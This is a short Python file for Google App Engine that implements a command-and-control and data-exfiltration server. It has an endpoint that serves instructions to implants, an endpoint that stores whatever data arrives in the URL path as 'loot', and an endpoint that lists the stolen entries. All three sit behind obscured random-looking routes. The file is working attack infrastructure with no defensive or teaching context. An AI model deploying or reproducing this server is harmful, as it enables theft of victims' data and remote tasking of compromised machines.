import webapp2
from google.appengine.ext import ndb

class ExfiltratedData(ndb.Model):
    date = ndb.DateTimeProperty(auto_now_add=True)
    data = ndb.StringProperty(indexed=False)

class CommandControl(webapp2.RequestHandler):
    def get(self):
        self.response.headers["Content-Type"] = "text/plain"
        self.response.write('Your instructions here...')

class Exfiltrate(webapp2.RequestHandler):
    def get(self, data):
        loot = ExfiltratedData()
        loot.data = data
        loot.put()

class ShowLoot(webapp2.RequestHandler):
    def get(self):
        self.response.headers["Content-Type"] = "text/plain"
        loot = ExfiltratedData.query().fetch()
        for result in loot:
            self.response.write("%s: %s\n" % (result.date, result.data))

app = webapp2.WSGIApplication([
    (r"/e2e7765b71c1", CommandControl),
    (r"/858e6f3e2b7b/(.+)", Exfiltrate),
    (r"/cf0a5906cadb", ShowLoot),
], debug=True)
